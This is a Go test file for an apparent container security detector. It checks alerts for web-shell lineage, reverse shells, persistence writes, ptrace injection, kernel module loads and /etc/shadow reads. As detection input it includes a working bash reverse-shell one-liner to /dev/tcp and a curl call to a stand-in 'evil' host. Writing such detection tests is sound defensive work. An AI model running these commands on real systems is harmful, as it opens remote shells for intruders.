package detector

import (
	"testing"

	"kernelwatch/internal/alerter"
	"kernelwatch/internal/collector"
	"kernelwatch/internal/config"
	"kernelwatch/internal/container"
)

func newTestDetector(t *testing.T) *Detector {
	t.Helper()
	return New(&config.Config{Mode: "alert", AncestryDepth: 5})
}

func testContainer() *container.Info {
	return &container.Info{ID: "abc123def4567890", ShortID: "abc123def456", Name: "app", ImageName: "app:latest"}
}

// containerExec builds a monitored container execve event.
func containerExec(filename, cmdline string, ancestry []string) collector.Event {
	return collector.Event{
		PID:       1234,
		Type:      collector.EventExecve,
		Filename:  filename,
		Args:      []string{filename},
		CmdLine:   cmdline,
		Ancestry:  ancestry,
		Container: testContainer(),
	}
}

func byRule(alerts []*alerter.Alert, ruleID string) *alerter.Alert {
	for _, a := range alerts {
		if a != nil && a.RuleID == ruleID {
			return a
		}
	}
	return nil
}

func TestLineageAwareShellDetection(t *testing.T) {
	cases := []struct {
		name      string
		ancestry  []string
		wantAlert bool
		wantSev   alerter.Severity
	}{
		{"shell from cron is suppressed", []string{"sh", "cron"}, false, ""},
		{"shell from entrypoint supervisor is suppressed", []string{"containerd-shim"}, false, ""},
		{"shell from nginx is critical (web-shell)", []string{"sh", "nginx"}, true, alerter.SeverityCritical},
		{"shell from php-fpm is critical", []string{"php-fpm"}, true, alerter.SeverityCritical},
		{"shell from unknown parent is high", []string{"weirdproc"}, true, alerter.SeverityHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := newTestDetector(t)
			shell := byRule(d.Check(containerExec("/bin/bash", "bash", tc.ancestry)), "shell_in_container")
			if tc.wantAlert && shell == nil {
				t.Fatalf("expected a shell alert, got none")
			}
			if !tc.wantAlert && shell != nil {
				t.Fatalf("expected suppression, got alert: %s", shell.Reason)
			}
			if tc.wantAlert && shell.Severity != tc.wantSev {
				t.Fatalf("severity = %s, want %s", shell.Severity, tc.wantSev)
			}
		})
	}
}

func TestReverseShellAlwaysCritical(t *testing.T) {
	d := newTestDetector(t)
	// Even spawned by a "trusted" parent, a reverse-shell payload is critical.
	e := containerExec("/bin/bash", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"cron"})
	if a := byRule(d.Check(e), "reverse_shell"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical reverse_shell alert, got %#v", a)
	}
}

func TestNetworkToolLineage(t *testing.T) {
	d1 := newTestDetector(t)
	if a := byRule(d1.Check(containerExec("/usr/bin/curl", "curl http://health", []string{"sh", "cron"})), "network_tool"); a != nil {
		t.Fatalf("curl from cron healthcheck should be suppressed, got %s", a.Reason)
	}
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(containerExec("/usr/bin/curl", "curl http://evil", []string{"php-fpm"})), "network_tool"); a == nil || a.Severity != alerter.SeverityHigh {
		t.Fatalf("curl from php-fpm should be High, got %#v", a)
	}
	// Bare `php` (the CLI runtime, e.g. artisan) is NOT network-facing → Medium, not High.
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(containerExec("/usr/bin/curl", "curl http://x", []string{"php"})), "network_tool"); a == nil || a.Severity != alerter.SeverityMedium {
		t.Fatalf("curl from bare php should be Medium (not escalated), got %#v", a)
	}
}

func TestContainerDrift(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(containerExec("/tmp/.x/miner", "/tmp/.x/miner", []string{"sh"})), "container_drift"); a == nil {
		t.Fatal("expected drift alert for binary in /tmp")
	}
}

func TestExceptionSuppresses(t *testing.T) {
	d := New(&config.Config{Mode: "alert", AncestryDepth: 5, DetectionExceptions: []string{"trusted-image"}})
	e := containerExec("/bin/bash", "bash", []string{"nginx"})
	e.Container.ImageName = "registry/trusted-image:1.0"
	if alerts := d.Check(e); len(alerts) != 0 {
		t.Fatalf("exception should suppress all alerts, got %d", len(alerts))
	}
}

func TestHostEventsIgnored(t *testing.T) {
	d := newTestDetector(t)
	e := containerExec("/bin/bash", "bash", []string{"nginx"})
	e.Container = nil
	if alerts := d.Check(e); alerts != nil {
		t.Fatalf("host events must be ignored, got %d alerts", len(alerts))
	}
}

func TestPersistenceWriteDetected(t *testing.T) {
	d := newTestDetector(t)
	// Write-mode open (O_WRONLY|O_CREAT) of a cron path → persistence alert.
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/cron.d/backdoor", Arg1: 0x1 | 0x40, Container: testContainer()}
	if a := byRule(d.Check(e), "persistence"); a == nil {
		t.Fatal("expected persistence alert for write to /etc/cron.d")
	}
	// ld.so.preload write → critical.
	d2 := newTestDetector(t)
	e2 := collector.Event{Type: collector.EventOpen, Filename: "/etc/ld.so.preload", Arg1: 0x2, Container: testContainer()}
	if a := byRule(d2.Check(e2), "persistence"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical persistence alert for ld.so.preload, got %#v", a)
	}
}

func TestPersistenceReadOnlyIgnored(t *testing.T) {
	d := newTestDetector(t)
	// Read-only open (flags=0) of a cron path must NOT alert persistence.
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/crontab", Arg1: 0, Container: testContainer()}
	if a := byRule(d.Check(e), "persistence"); a != nil {
		t.Fatal("read-only open should not raise a persistence alert")
	}
}

func TestProcessInjection(t *testing.T) {
	d := newTestDetector(t)
	e := collector.Event{Type: collector.EventPtrace, Arg1: 16 /*ATTACH*/, Arg2: 999, Container: testContainer()}
	if a := byRule(d.Check(e), "process_injection"); a == nil || a.Severity != alerter.SeverityHigh {
		t.Fatalf("expected process_injection alert, got %#v", a)
	}
	// A benign ptrace request (TRACEME=0) should not fire.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(collector.Event{Type: collector.EventPtrace, Arg1: 0, Container: testContainer()}), "process_injection"); a != nil {
		t.Fatal("PTRACE_TRACEME should not raise injection alert")
	}
}

func TestKernelTampering(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(collector.Event{Type: collector.EventModule, Container: testContainer()}), "kernel_module_load"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatal("expected critical kernel_module_load alert")
	}
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(collector.Event{Type: collector.EventBPF, Arg1: 5 /*PROG_LOAD*/, Container: testContainer()}), "bpf_prog_load"); a == nil {
		t.Fatal("expected bpf_prog_load alert")
	}
	// A non-load bpf command (e.g. map lookup) should not fire.
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(collector.Event{Type: collector.EventBPF, Arg1: 1, Container: testContainer()}), "bpf_prog_load"); a != nil {
		t.Fatal("non-load bpf command should not raise an alert")
	}
}

func TestSensitiveFileOpen(t *testing.T) {
	d := newTestDetector(t)
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/shadow", Container: testContainer()}
	if a := byRule(d.Check(e), "sensitive_file"); a == nil {
		t.Fatal("expected sensitive_file alert for /etc/shadow")
	}
}
